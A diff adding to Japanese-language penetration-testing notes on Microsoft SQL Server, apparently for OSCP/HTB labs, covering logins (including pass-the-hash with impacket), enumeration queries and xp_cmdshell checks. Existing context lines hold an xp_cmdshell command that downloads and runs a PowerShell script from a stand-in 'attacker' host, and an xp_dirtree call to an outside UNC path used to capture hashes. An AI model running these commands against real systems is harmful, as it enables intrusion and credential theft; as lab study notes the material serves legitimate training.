@@ -24,6 +24,221 @@ nav_order: 1433
 
 
 ---
+# Access
+
+# MSSQL ログイン方法まとめ
+
+## Windows
+
+### SQL認証
+
+```powershell
+sqlcmd -S 192.168.1.10 -U sa -P Password123!
+```
+
+または
+
+```powershell
+sqlcmd -S servername\SQLEXPRESS -U username -P password
+```
+
+---
+
+### Windows認証（統合認証）
+
+```powershell
+sqlcmd -S servername -E
+```
+
+- `-E` : 現在ログイン中のWindowsユーザーで認証
+
+---
+
+## Linux
+
+### sqlcmd
+
+```bash
+sqlcmd -S 192.168.1.10 -U sa -P 'Password123!'
+```
+
+接続確認
+
+```sql
+SELECT @@VERSION;
+GO
+```
+
+---
+
+### Impacket mssqlclient
+
+#### SQL認証
+
+```bash
+impacket-mssqlclient sa:Password123!@192.168.1.10
+```
+
+#### Windows認証
+
+```bash
+impacket-mssqlclient domain/user:Password123!@192.168.1.10
+```
+
+#### Pass-the-Hash
+
+```bash
+impacket-mssqlclient -hashes :NTHASH domain/user@192.168.1.10
+```
+
+---
+
+## GUI接続
+
+### SQL Server Management Studio (SSMS)
+
+接続時に指定する項目
+
+- Server Name
+- Authentication
+  - Windows Authentication
+  - SQL Server Authentication
+- Username
+- Password
+
+---
+
+# 接続後の基本確認
+
+## 現在のログインユーザー
+
+```sql
+SELECT SYSTEM_USER;
+```
+
+---
+
+## sysadmin権限の確認
+
+```sql
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
+出力:
+
+|値|意味|
+|---|---|
+|1|sysadmin|
+|0|非sysadmin|
+|NULL|確認不可|
+
+---
+
+## SQL Serverバージョン確認
+
+```sql
+SELECT @@VERSION;
+```
+
+---
+
+## ホスト名確認
+
+```sql
+SELECT @@SERVERNAME;
+```
+
+---
+
+## データベース一覧
+
+```sql
+SELECT name FROM sys.databases;
+```
+
+---
+
+## 現在のデータベース
+
+```sql
+SELECT DB_NAME();
+```
+
+---
+
+## 現在の権限確認
+
+```sql
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+```
+
+---
+
+# よく使う列挙コマンド
+
+## ログインユーザー一覧
+
+```sql
+SELECT name
+FROM sys.sql_logins;
+```
+
+---
+
+## サーバーロール確認
+
+```sql
+SELECT
+    sp.name AS LoginName,
+    sr.name AS ServerRole
+FROM sys.server_role_members rm
+JOIN sys.server_principals sp
+    ON rm.member_principal_id = sp.principal_id
+JOIN sys.server_principals sr
+    ON rm.role_principal_id = sr.principal_id;
+```
+
+---
+
+## リンクサーバー確認
+
+```sql
+EXEC sp_linkedservers;
+```
+
+---
+
+## xp_cmdshell有効確認
+
+```sql
+EXEC sp_configure 'xp_cmdshell';
+```
+
+---
+
+## 高度な設定確認
+
+```sql
+EXEC sp_configure 'show advanced options';
+```
+
+---
+
+# OSCP/HTBで最初に確認する項目
+
+```sql
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT @@SERVERNAME;
+SELECT @@VERSION;
+```
+
+この4つで以下を把握できる。
+
+- 誰でログインしているか
+- sysadminか
+- サーバー名
+- SQL Serverのバージョン
 
 # Login
 
@@ -167,7 +382,13 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 ```powershell
 EXEC xp_cmdshell 'whoami';
+```
+
+```powershell
 EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';
+```
+
+```powershell
 exec xp_dirtree '\\192.168.45.186\test';
 ```
 
